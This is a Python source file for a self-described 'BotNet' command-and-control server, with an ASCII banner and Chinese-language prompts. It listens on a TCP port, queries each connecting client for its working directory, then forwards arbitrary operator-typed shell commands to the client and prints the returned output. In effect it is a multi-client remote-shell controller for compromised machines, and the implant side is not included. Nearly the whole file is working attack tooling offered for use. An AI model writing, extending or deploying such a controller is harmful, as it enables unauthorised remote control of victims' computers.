import socket
import threading
import os

os.system('cls')

with open('version.txt', 'r', encoding='utf-8') as f:
    version = f.read()
with open('BotNetcmdhelp.txt', 'r', encoding='utf-8') as f:
    BotNetcmdhelp = f.read()

title = f"""
BBBBBBBBBBBBBBBBB        OOOOOOOOO     TTTTTTTTTTTTTTTTTTTTTTT   NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEETTTTTTTTTTTTTTTTTTTTTT
B::::::::::::::::B     OO:::::::::OO   T:::::::::::::::::::::T   N:::::::N       N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
B::::::BBBBBB:::::B  OO:::::::::::::OO T:::::::::::::::::::::T   N::::::::N      N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
BB:::::B     B:::::BO:::::::OOO:::::::OT:::::TT:::::::TT:::::T   N:::::::::N     N::::::NEE::::::EEEEEEEEE::::ET:::::TT:::::::TT:::::T
  B::::B     B:::::BO::::::O   O::::::OTTTTTT  T:::::T  TTTTTT   N::::::::::N    N::::::N  E:::::E       EEEEEETTTTTT  T:::::T  TTTTTT
  B::::B     B:::::BO:::::O     O:::::O        T:::::T           N:::::::::::N   N::::::N  E:::::E                     T:::::T        
  B::::BBBBBB:::::B O:::::O     O:::::O        T:::::T           N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE           T:::::T        
  B:::::::::::::BB  O:::::O     O:::::O        T:::::T           N::::::N N::::N N::::::N  E:::::::::::::::E           T:::::T        
  B::::BBBBBB:::::B O:::::O     O:::::O        T:::::T           N::::::N  N::::N:::::::N  E:::::::::::::::E           T:::::T        
  B::::B     B:::::BO:::::O     O:::::O        T:::::T           N::::::N   N:::::::::::N  E::::::EEEEEEEEEE           T:::::T        
  B::::B     B:::::BO:::::O     O:::::O        T:::::T           N::::::N    N::::::::::N  E:::::E                     T:::::T        
  B::::B     B:::::BO::::::O   O::::::O        T:::::T           N::::::N     N:::::::::N  E:::::E       EEEEEE        T:::::T        
BB:::::BBBBBB::::::BO:::::::OOO:::::::O      TT:::::::TT         N::::::N      N::::::::NEE::::::EEEEEEEE:::::E      TT:::::::TT
B:::::::::::::::::B  OO:::::::::::::OO       T:::::::::T         N::::::N       N:::::::NE::::::::::::::::::::E      T:::::::::T
B::::::::::::::::B     OO:::::::::OO         T:::::::::T         N::::::N        N::::::NE::::::::::::::::::::E      T:::::::::T
BBBBBBBBBBBBBBBBB        OOOOOOOOO           TTTTTTTTTTT         NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE      TTTTTTTTTTT

版本: {version}
查看CMD帮助: BotNetcmdhelp.txt
{'=' * 134}
"""

def handle_client(client_socket, address):
    print(f"{'=' * 60}\n{BotNetcmdhelp}\n{'=' * 60}")
    print(f"[*] 接受来自 {address[0]}:{address[1]} 的连接")
    
    try:
        # 初始获取客户端当前目录
        client_socket.send("pwd".encode('utf-8'))  # 发送pwd命令获取客户端当前目录
        current_dir = client_socket.recv(4096).decode('utf-8', errors='ignore').strip()
        
        while True:
            command = input(f"{current_dir}> ")
            if not command:
                continue
            if command.lower() == 'exit':
                break
            if command.lower() == 'cls':
                os.system('cls')
                continue
            
            # 发送命令给客户端
            client_socket.send(command.encode('utf-8'))
            
            # 接收客户端返回的输出
            output = client_socket.recv(4096).decode('utf-8', errors='ignore')
            
            # 如果是cd命令，更新current_dir
            if command.lower().startswith('cd '):
                current_dir = output.split(":")[-1].strip() if "目录已更改为:" in output else current_dir
                print(output)
            else:
                if output:
                    print(f"来自 {address[0]} 的输出:\n{output}")
                    
    except Exception as e:
        print(f"与 {address[0]} 通信时出错: {e}")
    finally:
        client_socket.close()
        print(f"[*] 与 {address[0]}:{address[1]} 的连接已关闭")

def start_server():
    host = '127.0.0.1'
    port = 1000
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] 服务器监听在 {host}:{port}")
    try:
        while True:
            client_socket, address = server.accept()
            client_handler = threading.Thread(
                target=handle_client,
                args=(client_socket, address)
            )
            client_handler.start()
    except KeyboardInterrupt:
        print("\n[*] 服务器正在关闭...")
    finally:
        server.close()

if __name__ == "__main__":
    print(title)
    start_server()